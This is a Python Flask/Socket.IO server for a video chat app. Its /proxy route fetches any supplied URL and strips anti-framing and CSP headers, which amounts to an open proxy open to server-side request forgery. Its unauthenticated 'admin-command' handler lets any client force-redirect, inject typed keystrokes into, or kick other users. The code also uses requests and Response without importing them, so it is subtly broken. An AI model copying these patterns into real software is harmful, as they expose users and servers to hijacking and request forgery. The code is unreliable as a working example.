from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
import os
import re

app = Flask(__name__)
app.config['SECRET_KEY'] = 'video-chat-key'
socketio = SocketIO(app, cors_allowed_origins="*", logger=True, engineio_logger=True)

# Mapping of username -> session_id
user_sessions = {}

@app.route('/proxy')
def proxy():
    url = request.args.get('url')
    if not url:
        return "No URL provided", 400
    
    # Ensure URL has a protocol
    if not url.startswith('http'):
        url = 'http://' + url

    try:
        # Fetch the target website
        # We use a common User-Agent to avoid being blocked as a bot
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'}
        resp = requests.get(url, headers=headers, stream=True, timeout=10)
        
        # Filter out security headers that prevent iframing
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 
                            'x-frame-options', 'content-security-policy', 'strict-transport-security']
        
        headers = [(name, value) for (name, value) in resp.raw.headers.items()
                   if name.lower() not in excluded_headers]

        # Create the response
        response = Response(resp.content, resp.status_code, headers)
        return response
        
    except Exception as e:
        return f"Proxy Error: {str(e)}", 500

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('join')
def on_join(data):
    sid = request.sid
    username = data.get('username')
    user_sessions[username] = sid # Store mapping
    data['id'] = sid 
    emit('user-joined', data, broadcast=True, include_self=False)

@socketio.on('signal')
def on_signal(data):
    recipient_sid = data.get('to')
    emit('signal', data, room=recipient_sid)

@socketio.on('chat-message')
def handle_message(data):
    emit('chat-message', data, broadcast=True)

# --- UPDATED ADMIN COMMAND HANDLER ---
@socketio.on('admin-command')
def handle_admin(data):
    cmd_text = data.get('command', '')
    
    # 1. Existing !open command
    open_match = re.search(r'!open\s+["\']?([^"\s]+)["\']?\s+(\S+)', cmd_text)
    if open_match:
        url = open_match.group(1)
        target_user = open_match.group(2)
        if target_user in user_sessions:
            emit('force-redirect', {'url': url}, room=user_sessions[target_user])

    # 2. Existing !type command
    type_match = re.search(r'!type\s+["\']?([^"\']+)["\']?\s+(\S+)(?:\s+(\d+))?', cmd_text)
    if type_match:
        sequence = type_match.group(1)
        target_user = type_match.group(2)
        # Get delay if it exists, otherwise default to 0
        delay = int(type_match.group(3)) if type_match.group(3) else 0
        
        if target_user in user_sessions:
            emit('remote-type', {
                'sequence': sequence, 
                'delay': delay
            }, room=user_sessions[target_user])

    # 3. NEW !kick command
    # Regex captures: !kick username
    kick_match = re.search(r'!kick\s+(\S+)', cmd_text)
    if kick_match:
        target_user = kick_match.group(1)
        if target_user in user_sessions:
            # Send the kick event to the target user
            emit('force-kick', {}, room=user_sessions[target_user])

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
